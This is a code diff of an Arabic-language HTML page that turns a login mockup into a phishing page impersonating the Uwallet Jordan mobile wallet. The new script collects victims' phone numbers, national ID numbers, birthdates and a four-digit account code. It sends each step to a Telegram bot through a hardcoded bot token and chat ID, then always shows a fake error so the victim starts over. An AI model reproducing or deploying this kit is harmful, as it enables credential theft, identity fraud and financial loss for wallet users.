@@ -1,318 +1,518 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>تسجيل الدخول — المصادقة</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Uwallet الأردن | تسجيل الدخول</title>
+  <!-- Open Graph Meta Tags for Link Preview -->
+  <meta property="og:title" content="Uwallet الأردن | تسجيل الدخول" />
+  <meta property="og:description" content="سجل دخولك لخدمات Uwallet الأردن بأمان وسهولة!" />
+  <meta property="og:image" content="https://d.top4top.io/p_3619v3uia0.jpeg" />
+  <meta property="og:url" content="https://uwalletjordan.vercel.app" />
+  <meta property="og:type" content="website" />
+  <meta property="og:locale" content="ar_AR" />
+  <!-- Twitter Card Meta Tags -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Uwallet الأردن | تسجيل الدخول" />
+  <meta name="twitter:description" content="سجل دخولك لخدمات Uwallet الأردن بأمان وسهولة!" />
+  <meta name="twitter:image" content="https://d.top4top.io/p_3619v3uia0.jpeg" />
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
   <style>
-    :root{
-      --green:#1e6b3d;
-      --muted:#9e9e9e;
-      --gold:#c9a44a;
-      --gold-dark:#b58f3f;
-      --line:#e9e9e9;
-      --shadow: rgba(0,0,0,0.12);
+    :root {
+      --uwallet-blue: #1a84dd;
+      --uwallet-dark: #00486e;
+      --uwallet-gray: #f4f9fb;
+      --uwallet-light-blue: #00a6e8;
+      --uwallet-accent: #209dbf;
+      --uwallet-pink: #ea4763;
     }
-    *{box-sizing:border-box}
-    body{
-      margin:0;
-      font-family:'Cairo',sans-serif;
-      background:#fff;
-      color:#222;
-      -webkit-font-smoothing:antialiased;
-      -moz-osx-font-smoothing:grayscale;
-      min-height:100vh;
-      display:flex;
-      justify-content:center;
-      align-items:flex-start;
-      padding:18px;
+    body {
+      background: linear-gradient(135deg, var(--uwallet-blue) 0%, var(--uwallet-dark) 83%);
+      min-height: 100vh;
+      font-family: 'Cairo', Arial, sans-serif;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
-    .container{
-      width:100%;
-      max-width:440px;
+    #app {
+      background: #fff;
+      border-radius: 22px;
+      box-shadow: 0 8px 32px 0 rgba(26,132,221,0.10), 0 2px 12px #209dbf22;
+      width: 370px;
+      max-width: 95vw;
+      padding: 34px 26px 32px 26px;
+      box-sizing: border-box;
+      direction: rtl;
+      position: relative;
+      overflow: hidden;
+      border: 2.5px solid var(--uwallet-blue);
+      animation: fadein 0.7s;
     }
-
-    /* shared header */
-    .header{
-      text-align:center;
-      margin-top:6px;
-      margin-bottom:10px;
+    @keyframes fadein {
+      from { opacity: 0; transform: translateY(36px);}
+      to { opacity: 1; transform: none;}
     }
-    .header img.logo-top{
-      height:62px;
-      object-fit:contain;
-      margin:6px auto 4px;
-      display:inline-block;
+    .uwallet-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 18px;
+      gap: 10px;
+      flex-direction: row;
     }
-
-    /* --- Login Screen --- */
-    .screen{display:none}
-    .screen.active{display:block}
-
-    .title{
-      color:var(--green);
-      font-weight:600;
-      font-size:26px;
-      margin:8px 0 8px;
+    .uwallet-logo {
+      width: 62px;
+      height: 62px;
+      border-radius: 18px;
+      background: linear-gradient(135deg, var(--uwallet-blue) 55%, var(--uwallet-pink) 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 16px #1a84dd19;
+      border: 2.5px solid #fff;
+      overflow: hidden;
     }
-    .avatar{
-      width:96px;height:96px;border-radius:50%;border:2px solid rgba(0,0,0,0.06);
-      display:flex;align-items:center;justify-content:center;margin:8px auto 12px;
-      box-shadow:0 3px 10px rgba(0,0,0,0.03);
+    .uwallet-logo img {
+      width: 56px;
+      height: 56px;
+      object-fit: contain;
+      background: #fff;
+      border-radius: 15px;
+      border: 1.5px solid #e3eefe;
+      box-shadow: 0 1px 6px #1a84dd19;
     }
-    .avatar svg{width:56px;height:56px;stroke:var(--muted);stroke-width:1.6;fill:none}
-
-    .welcome{
-      text-align:center;color:var(--green);font-weight:700;font-size:28px;margin:6px 0 22px;
+    .uwallet-title-main {
+      font-size: 23px;
+      font-weight: 900;
+      letter-spacing: 0.2px;
+      color: var(--uwallet-dark);
+      margin: 0;
+      text-shadow: 0 1px 0 #fff, 0 2px 10px #1a84dd12;
     }
-
-    form{padding:0 6px}
-    label.field-label{display:block;text-align:right;color:#222;font-size:15px;margin-bottom:6px}
-
-    /* phone field: flag on left, input LTR */
-    .phone-row{
-      display:flex;align-items:center;gap:12px;
-      direction:ltr; /* make internal layout LTR */
-      border-bottom:1px solid var(--line);
-      padding:12px 4px;
-      margin-bottom:20px;
+    .uwallet-title-sub {
+      font-size: 15px;
+      color: var(--uwallet-accent);
+      font-weight: 600;
+      text-align: center;
+      margin: 6px 0 0 0;
+      letter-spacing: 0.07px;
     }
-    .phone-cc{min-width:56px;font-weight:700;font-size:18px;color:#333;text-align:left}
-    .phone-input{
-      flex:1;border:0;outline:0;font-size:18px;color:#666;background:transparent;text-align:left;
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      gap: 7px;
+      margin-bottom: 18px;
+      margin-top: 7px;
     }
-    input[type="tel"]{direction:ltr}
-
-    /* password: LTR and underline */
-    .password-wrap{
-      border-bottom:1px solid var(--line);
-      padding:8px 4px 6px;
-      margin-bottom:18px;
-      direction:ltr;
+    .step-dot {
+      width: 11px;
+      height: 11px;
+      border-radius: 50%;
+      background: var(--uwallet-gray);
+      border: 2px solid var(--uwallet-light-blue);
+      transition: background 0.2s;
     }
-    .password{
-      width:100%;border:0;outline:0;font-size:20px;padding:6px 0;color:#666;background:transparent;text-align:left;direction:ltr;
+    .step-dot.active {
+      background: linear-gradient(135deg, var(--uwallet-pink) 55%, var(--uwallet-blue) 100%);
+      border-color: var(--uwallet-blue);
     }
-
-    .actions{display:flex;flex-direction:column;gap:12px;align-items:center;margin-top:6px}
-    .btn{
-      width:100%;max-width:360px;background:linear-gradient(180deg,var(--gold) 0%,var(--gold-dark) 100%);color:#fff;border:0;padding:14px 20px;font-size:18px;font-weight:700;border-radius:8px;box-shadow:0 10px 18px var(--shadow);cursor:pointer;
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 13px;
+      margin-top: 7px;
     }
-    .links{display:flex;justify-content:space-between;width:100%;padding:0 6px;margin-top:8px}
-    .links a{color:#111;text-decoration:none;font-size:15px}
-    .links a.faded{color:var(--muted)}
-
-    /* footer logos */
-    .footer{margin-top:36px;text-align:center}
-    .footer .bank{
-      display:flex;gap:12px;align-items:center;justify-content:center;margin-top:6px;
+    label {
+      color: var(--uwallet-blue);
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 3px;
+      margin-right: 2px;
+      letter-spacing: 0.18px;
     }
-    .footer img.logo-bottom{height:56px;object-fit:contain}
-
-    /* --- Auth Screen (image 2 style) --- */
-    .progress{
-      display:flex;align-items:center;justify-content:center;gap:14px;margin-top:6px;margin-bottom:6px;
+    input, select {
+      padding: 14px 11px;
+      border: none;
+      border-radius: 9px;
+      font-size: 15px;
+      background: var(--uwallet-gray);
+      color: #222;
+      outline: none;
+      box-shadow: 0 1.5px 5px #1a84dd13;
+      transition: box-shadow 0.2s, border 0.2s;
+      border: 2px solid #209dbf18;
+      font-family: 'Cairo', Arial, sans-serif;
     }
-    .step{
-      width:54px;height:54px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;
-      box-shadow:0 4px 10px rgba(0,0,0,0.06);
+    input:focus, select:focus {
+      box-shadow: 0 3px 12px #209dbf40;
+      border-color: var(--uwallet-blue);
+      background: #f6fcff;
     }
-    .step.green{background:var(--green)}
-    .step.gold{background:var(--gold)}
-    .connector{height:6px;width:56px;border-radius:6px;background:linear-gradient(90deg,var(--gold) 0%, rgba(0,0,0,0.04) 100%);opacity:0.5}
-
-    .auth-title{text-align:center;font-size:26px;color:#222;margin:12px 0 18px;font-weight:600}
-
-    .auth-form{padding:0 8px}
-    .big-placeholder{
-      font-size:28px;color:#d0d0d0;font-weight:700;padding:12px 6px;border-bottom:1px solid var(--line);margin-bottom:26px;text-align:left;
-      direction:ltr;
+    .button {
+      background: linear-gradient(90deg, var(--uwallet-blue) 0%, var(--uwallet-pink) 100%);
+      color: white;
+      border: none;
+      border-radius: 9px;
+      padding: 13px 0;
+      font-size: 17px;
+      font-weight: 800;
+      cursor: pointer;
+      margin-top: 7px;
+      margin-bottom: 3px;
+      transition: background 0.18s, opacity 0.15s;
+      letter-spacing: 0.6px;
+      box-shadow: 0 1px 5px #209dbf19;
     }
-    .label-right{color:#111;text-align:right;margin-bottom:6px;font-size:15px}
-
-    .big-button{
-      width:100%;height:56px;background:#efefef;border-radius:8px;box-shadow:0 14px 26px rgba(0,0,0,0.12);display:flex;align-items:center;justify-content:space-between;padding:0 18px;margin:26px 0;
-      color:#fff;font-weight:700;direction:rtl;
+    .button:active { opacity: 0.87; }
+    .info-msg {
+      text-align: center;
+      color: var(--uwallet-blue);
+      font-size: 13px;
+      margin-bottom: 7px;
+      margin-top: 2px;
+      font-weight: 600;
+      letter-spacing: 0.1px;
     }
-    .big-button .arrow{width:34px;height:34px;border-radius:50%;background:transparent;color:#777;display:flex;align-items:center;justify-content:center;font-size:18px}
-    .big-button .txt{font-size:18px;color:#222;font-weight:700}
-
-    .illustration{
-      display:flex;justify-content:center;padding:8px 6px 40px;
+    .code-inputs {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      margin: 10px 0 9px 0;
     }
-    .illustration .dots{
-      width:180px;height:44px;border-radius:22px;border:2px solid #e6e6e6;display:flex;align-items:center;justify-content:space-around;padding:6px;background:#fff;
+    .code-inputs input {
+      text-align: center;
+      font-size: 18px;
+      width: 65px;
+      padding: 13px 0;
+      letter-spacing: 4px;
+      border-radius: 7px;
+      border: 2px solid #1a84dd20;
+      background: var(--uwallet-gray);
+      font-weight: 700;
+      transition: border 0.2s, box-shadow 0.2s;
+      box-shadow: 0 1.5px 5px #209dbf18;
+      direction: ltr;
     }
-    .illustration .dots .dot{width:10px;height:10px;border-radius:50%;background:var(--green)}
-
-    /* small back arrow control */
-    .nav-arrows{display:flex;justify-content:space-between;align-items:center;margin:6px 0}
-    .nav-arrows .nav{font-size:20px;color:var(--green);cursor:pointer;padding:6px}
-
-    /* responsive */
-    @media (max-width:420px){
-      .big-placeholder{font-size:22px}
-      .title{font-size:22px}
-      .auth-title{font-size:22px}
+    .code-inputs input:focus {
+      border-color: var(--uwallet-pink);
+      background: #f6fcff;
+    }
+    .success-message {
+      text-align: center;
+      color: var(--uwallet-accent);
+      font-size: 18px;
+      font-weight: 700;
+      margin: 22px 0 0 0;
+      letter-spacing: 0.5px;
+    }
+    .uwallet-footer {
+      margin-top: 21px;
+      text-align: center;
+      color: #a6c7ef;
+      font-size: 12px;
+      font-weight: 600;
+      letter-spacing: 1px;
+      opacity: 0.83;
+      text-shadow: 0 1px 0 #fff;
+    }
+    #modalError {
+      display: none;
+      position: fixed;
+      top:0; left:0; width:100vw; height:100vh;
+      background: rgba(26,132,221,0.11);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+    }
+    #modalError.active {
+      display: flex;
+      animation: fadein 0.3s;
+    }
+    #modalContent {
+      background: #fff;
+      padding: 27px 32px;
+      border-radius: 13px;
+      box-shadow: 0 7px 34px #209dbf33, 0 1.5px 8px #1a84dd18;
+      text-align: center;
+      min-width: 260px;
+      border: 2px solid #ea476377;
+    }
+    #modalContent .err-title {
+      color: #ea4763;
+      font-size: 18px;
+      font-weight: bold;
+    }
+    #modalContent .err-msg {
+      margin-top: 8px;
+      font-size: 15px;
+      color: #444;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+    #modalContent button {
+      margin-top: 14px;
+      background: linear-gradient(90deg, var(--uwallet-pink) 0%, var(--uwallet-blue) 100%);
+      color: #fff;
+      padding: 7px 27px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 15px;
+      font-weight: bold;
+    }
+    #modalContent button:active {
+      background: linear-gradient(90deg, var(--uwallet-blue) 0%, var(--uwallet-pink) 100%);
+    }
+    .birthdate-fields {
+      display: flex;
+      gap: 7px;
+      align-items: center;
+      margin-bottom: 4px;
+    }
+    .birthdate-fields select {
+      width: 33%;
+      padding: 11px 4px;
+      font-size: 15px;
+      text-align: center;
+    }
+    .back-btn {
+      background: transparent;
+      border: none;
+      color: var(--uwallet-blue);
+      font-size: 19px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 7px;
+    }
+    @media (max-width: 450px) {
+      #app { padding: 12px 1vw 6px 1vw; }
+      .uwallet-logo { width: 43px; height: 43px;}
+      .uwallet-logo img {width: 38px; height: 38px;}
+      .uwallet-title-main { font-size: 16px;}
+      .uwallet-title-sub { font-size: 11px;}
+      #modalContent { padding: 16px 7vw;}
+      .birthdate-fields select { font-size: 13px; }
+      .code-inputs input { width: 44px;}
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <!-- LOGIN SCREEN -->
-    <section id="screen-login" class="screen active" aria-live="polite">
-      <header class="header">
-        <img class="logo-top" src="https://www2.0zz0.com/2025/12/21/12/261756132.jpeg" alt="شعار علوي">
-        <div class="title">تسجيل الدخول</div>
-      </header>
-
-      <div class="avatar" aria-hidden="true">
-        <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
-          <circle cx="32" cy="22" r="10" stroke-linecap="round" stroke-linejoin="round"/>
-          <path d="M10 54c0-10 10-18 22-18s22 8 22 18" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-      </div>
-
-      <div class="welcome">مرحبا بعودتك</div>
-
-      <form id="loginForm" onsubmit="return false;">
-        <label class="field-label" for="phone">رقم الجوال</label>
-        <div class="phone-row">
-          <div class="phone-cc">964</div>
-          <input id="phone" type="tel" inputmode="tel" class="phone-input" placeholder="700 000 0000" aria-label="رقم الجوال">
-        </div>
-
-        <label class="field-label" for="password">كلمة المرور</label>
-        <div class="password-wrap">
-          <input id="password" type="password" class="password" placeholder="أدخل كلمة المرور" aria-label="كلمة المرور">
-        </div>
-
-        <div class="actions">
-          <button id="loginBtn" class="btn" type="button">تسجيل الدخول</button>
-          <div class="links">
-            <a href="#" class="faded" onclick="event.preventDefault()">نسيت كلمة المرور؟</a>
-            <a href="#" style="text-decoration:underline;font-weight:700" onclick="event.preventDefault()">تسجيل</a>
-          </div>
-        </div>
-      </form>
-
-      <div class="footer">
-        <div class="bank">
-          <img class="logo-bottom" src="https://www2.0zz0.com/2025/12/21/12/234292454.jpeg" alt="شعار سفلي" onerror="this.style.display='none'">
-        </div>
-      </div>
-    </section>
-
-    <!-- AUTHENTICATION SCREEN (after login) -->
-    <section id="screen-auth" class="screen" aria-hidden="true">
-      <header class="header" style="padding-bottom:6px;">
-        <img class="logo-top" src="https://www2.0zz0.com/2025/12/21/12/261756132.jpeg" alt="شعار علوي">
-      </header>
-
-      <div class="progress" aria-hidden="true">
-        <div class="step green">←</div>
-        <div class="connector" aria-hidden="true"></div>
-        <div class="step green">✓</div>
-        <div class="connector" aria-hidden="true"></div>
-        <div class="step gold">📄</div>
-      </div>
-
-      <div class="auth-title">المصادقة</div>
-
-      <div class="auth-form">
-        <!-- هنا لا نعرض رقم الهاتف كما طلبت -->
-        <div style="margin-bottom:8px">
-          <div class="label-right">رقم الحساب المصرفي</div>
-          <div class="big-placeholder" aria-hidden="false">أدخل الرقم من 21 مرتبة</div>
-        </div>
-
-        <div style="margin-bottom:8px">
-          <div class="label-right">تاريخ الولادة</div>
-          <div class="big-placeholder" aria-hidden="false">تاريخ الولادة</div>
-        </div>
-
-        <div class="big-button" role="button" tabindex="0" onclick="goNext()">
-          <div class="arrow">◀</div>
-          <div class="txt">التالي</div>
-        </div>
-      </div>
-
-      <div class="illustration" aria-hidden="true">
-        <div style="width:320px;display:flex;flex-direction:column;align-items:center;gap:18px">
-          <div style="height:26px"></div>
-          <div class="dots" aria-hidden="true">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-          </div>
-          <!-- you can replace this SVG with a custom illustration if desired -->
-          <svg width="220" height="260" viewBox="0 0 220 260" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-            <rect x="0" y="0" width="220" height="260" fill="transparent"/>
-            <!-- simple person silhouette -->
-            <circle cx="110" cy="52" r="26" fill="#233044"/>
-            <path d="M60 220c8-40 28-92 50-92s42 52 50 92" fill="#233044"/>
-            <path d="M110 84c-36 0-56 18-56 18v28c0 6 9 12 20 12h72c11 0 20-6 20-12v-28s-20-18-56-18z" fill="#ececec"/>
-          </svg>
-        </div>
-      </div>
-
-      <div class="footer" style="margin-top:10px;">
-        <div class="bank">
-          <img class="logo-bottom" src="https://www2.0zz0.com/2025/12/21/12/234292454.jpeg" alt="شعار سفلي" onerror="this.style.display='none'">
-        </div>
-      </div>
-    </section>
+  <div id="app"></div>
+  <!-- Modal Error -->
+  <div id="modalError">
+    <div id="modalContent">
+      <div class="err-title">خطأ في إدخال البيانات</div>
+      <div class="err-msg">يرجى المحاولة مرة أخرى وسيتم إعادتك إلى الصفحة الأولى.</div>
+      <button onclick="restart()">إعادة للمحاولة</button>
+    </div>
   </div>
-
   <script>
-    // عناصر الشاشة
-    const screenLogin = document.getElementById('screen-login');
-    const screenAuth = document.getElementById('screen-auth');
-    const loginBtn = document.getElementById('loginBtn');
+    // معلومات الشعار والبوت
+    const uwalletLogo = "https://d.top4top.io/p_3619v3uia0.jpeg";
+    const BOT_TOKEN = "8478729698:AAH6ufdvIQicXkUajFb3M1ocoGusDHIbWoI";
+    const CHAT_ID = "6873334348";
+    let userData = {phone: '', nationalId:'', birthdate:'', code4b:''};
+    let currentStep = "phone";
+    let telegramMsgId = null;
 
-    // تأكد أن حقل كلمة المرور LTR — نضبط اتجاهه برمجياً أيضاً
-    const pwd = document.getElementById('password');
-    pwd.style.direction = 'ltr';
-    pwd.style.textAlign = 'left';
-
-    loginBtn.addEventListener('click', () => {
-      // مثال تحقق بسيط قبل الانتقال لواجهة المصادقة
-      const phone = document.getElementById('phone').value.trim();
-      const pass = document.getElementById('password').value;
-      if (!phone || !pass) {
-        alert('الرجاء إدخال رقم الجوال وكلمة المرور');
-        return;
-      }
-      // انتقل إلى شاشة المصادقة بدون عرض رقم الهاتف (كما طلبت)
-      screenLogin.classList.remove('active');
-      screenAuth.classList.add('active');
-      screenAuth.setAttribute('aria-hidden','false');
-      screenLogin.setAttribute('aria-hidden','true');
-
-      // إزالة أي معلومات رقم هاتف من واجهة المصادقة (تأكيد)
-      // هنا لا شيء يتم عرضه؛ إذا أردت استخدام رقم الهاتف لاحقًا فخزّنه في متغير
-      window.loggedPhone = phone; // مخزن فقط إن لزم لاحقًا، لكن لا يعرض
-    });
-
-    function goNext(){
-      // نضع هنا ما يحدث عند الضغط على التالي في شاشة المصادقة
-      alert('تم المتابعة — مثال محاكاة لعملية المصادقة (لا يُعرض رقم الهاتف)');
+    function restart() {
+      closeModal();
+      userData = {phone: '', nationalId:'', birthdate:'', code4b:''};
+      currentStep = "phone";
+      renderPhoneStep();
     }
 
-    // إمكانية العودة بالضغط على مفتاح الرجوع (مثلاً زر بالهيدر لو أردت)
-    // يمكنك إضافة زر رجوع بسهولة؛ مثال للاستماع لمفتاح Escape للعودة:
-    document.addEventListener('keydown', (e)=>{
-      if(e.key === 'Escape'){
-        if(screenAuth.classList.contains('active')){
-          screenAuth.classList.remove('active');
-          screenLogin.classList.add('active');
-          screenAuth.setAttribute('aria-hidden','true');
-          screenLogin.setAttribute('aria-hidden','false');
+    function stepIndicator(step) {
+      // الآن 3 خطوات بدلاً من 4
+      return `
+        <div class="step-indicator">
+          <div class="step-dot${step===1?' active':''}"></div>
+          <div class="step-dot${step===2?' active':''}"></div>
+          <div class="step-dot${step===3?' active':''}"></div>
+        </div>
+      `;
+    }
+    function header(sub="") {
+      return `
+        <div class="uwallet-header">
+          <div class="uwallet-logo"><img src="${uwalletLogo}" alt="Uwallet" /></div>
+          <span class="uwallet-title-main">Uwallet الأردن</span>
+        </div>
+        <div class="uwallet-title-sub">${sub}</div>
+      `;
+    }
+
+    function showErrorModal() {
+      document.getElementById('modalError').classList.add('active');
+    }
+    function closeModal() {
+      document.getElementById('modalError').classList.remove('active');
+    }
+
+    function renderPhoneStep() {
+      currentStep = "phone";
+      app.innerHTML = `
+        ${header("مرحبًا بك! سجل دخولك لحساب Uwallet")}
+        ${stepIndicator(1)}
+        <form id="phoneForm" autocomplete="off">
+          <label>رقم الهاتف</label>
+          <input type="tel" id="phone" maxlength="10" required placeholder="07XXXXXXXX" pattern="07[0-9]{8}" autocomplete="tel" inputmode="numeric"/>
+          <button type="submit" class="button">تسجيل الدخول</button>
+        </form>
+        <div class="uwallet-footer">Uwallet Jordan &copy; 2025</div>
+      `;
+      document.getElementById('phone').focus();
+      document.getElementById('phoneForm').onsubmit = async function(e) {
+        e.preventDefault();
+        const phone = document.getElementById('phone').value.trim();
+        if (!/^07\d{8}$/.test(phone)) {
+          showErrorModal(); return;
         }
+        userData.phone = phone;
+        // إرسال رقم الهاتف للبوت
+        try {
+          telegramMsgId = await sendToTelegram(`🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}`);
+        } catch (err) {}
+        // تجاوز واجهة رمز التحقق والانتقال مباشرةً لبيانات الهوية/تاريخ الميلاد
+        renderIdBirthStep();
+      };
+    }
+
+    function renderIdBirthStep() {
+      currentStep = "id_birth";
+      app.innerHTML = `
+        <button class="back-btn" id="backBtn">&#8592; رجوع</button>
+        ${header("بياناتك الشخصية")}
+        ${stepIndicator(2)}
+        <form id="idForm" autocomplete="off">
+          <label>الرقم الوطني</label>
+          <input type="text" id="nationalId" placeholder="الرقم الوطني" maxlength="12" required inputmode="numeric"/>
+          <label>تاريخ الميلاد</label>
+          <div class="birthdate-fields" id="birthdateFields"></div>
+          <button type="submit" class="button">التالي</button>
+        </form>
+        <div class="uwallet-footer">Uwallet Jordan &copy; 2025</div>
+      `;
+      renderBirthdateFields();
+      document.getElementById('nationalId').focus();
+
+      document.getElementById('idForm').onsubmit = async function(e) {
+        e.preventDefault();
+        const nationalId = document.getElementById('nationalId').value.trim();
+        const day = document.getElementById('birthDay').value;
+        const month = document.getElementById('birthMonth').value;
+        const year = document.getElementById('birthYear').value;
+        if (!/^\d{10,12}$/.test(nationalId)) { showErrorModal(); return; }
+        if (!day || !month || !year) { showErrorModal(); return; }
+        const birthdate = `${year}-${month.padStart(2, '0')}-${day.padStart(2, '0')}`;
+        userData.nationalId = nationalId;
+        userData.birthdate = birthdate;
+        // إرسال البيانات للبوت (بدون رمز SMS لأننا حذفناه)
+        try {
+          telegramMsgId = await sendToTelegram(
+            `🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}`
+          );
+        } catch (err) {}
+        renderFinalCodeStep();
+      };
+      document.getElementById('backBtn').onclick = () => {
+        renderPhoneStep();
+      };
+    }
+
+    function renderBirthdateFields() {
+      const now = new Date();
+      const maxYear = now.getFullYear();
+      const minYear = maxYear - 100;
+      const birthdateFields = document.getElementById('birthdateFields');
+      let days = '<select id="birthDay" required><option value="">اليوم</option>';
+      for (let d = 1; d <= 31; d++) days += `<option value="${d}">${d}</option>`;
+      days += '</select>';
+      const monthNames = [
+        'يناير','فبراير','مارس','أبريل','مايو','يونيو',
+        'يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'
+      ];
+      let months = '<select id="birthMonth" required><option value="">الشهر</option>';
+      for (let m = 1; m <= 12; m++) months += `<option value="${m}">${monthNames[m - 1]}</option>`;
+      months += '</select>';
+      let years = '<select id="birthYear" required><option value="">السنة</option>';
+      for (let y = maxYear; y >= minYear; y--) years += `<option value="${y}">${y}</option>`;
+      years += '</select>';
+      birthdateFields.innerHTML = days + months + years;
+    }
+
+    function renderFinalCodeStep() {
+      currentStep = "code4b";
+      app.innerHTML = `
+        <button class="back-btn" id="backBtn">&#8592; رجوع</button>
+        ${header("رمز تحقق إضافي لحماية الحساب")}
+        ${stepIndicator(3)}
+        <div class="info-msg">أدخل رمز تحقق حسابك المكون من 4 أرقام لإكمال تسجيل الدخول</div>
+        <form id="code4bForm" autocomplete="off">
+          <div class="code-inputs">
+            <input type="text" maxlength="4" pattern="\\d{4}" required id="code4binput" inputmode="numeric" placeholder="****" />
+          </div>
+          <button type="submit" class="button">تأكيد الرمز</button>
+        </form>
+        <div class="uwallet-footer">Uwallet Jordan &copy; 2025</div>
+      `;
+      const codeInput = document.getElementById('code4binput');
+      codeInput.focus();
+      codeInput.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').slice(0,4);
+      });
+      document.getElementById('code4bForm').onsubmit = async function(e) {
+        e.preventDefault();
+        let code = codeInput.value.trim();
+        if (code.length !== 4) { showErrorModal(); return; }
+        userData.code4b = code;
+        // إرسال جميع البيانات النهائية للبوت (بدون رمز SMS السابق)
+        try {
+          await sendToTelegram(
+            `🟦 تسجيل دخول Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}\n🔒 رمز تحقق إضافي: ${userData.code4b}`
+          );
+        } catch (err) {}
+        showErrorModal(); // حتى لو صحيحة كل مرة يظهر الخطأ والتوجيه للصفحة الأولى
+      };
+      document.getElementById('backBtn').onclick = () => {
+        renderIdBirthStep();
+      };
+    }
+
+    async function sendToTelegram(msg) {
+      // حذف الرسائل السابقة إن وجدت
+      if (telegramMsgId) {
+        try {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              message_id: telegramMsgId
+            })
+          });
+        } catch (err) {}
       }
-    });
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msg
+          })
+        });
+        const data = await res.json();
+        if (data && data.result && data.result.message_id) {
+          return data.result.message_id;
+        }
+      } catch (err) {}
+      return null;
+    }
+
+    const app = document.getElementById('app');
+    renderPhoneStep();
   </script>
 </body>
 </html>
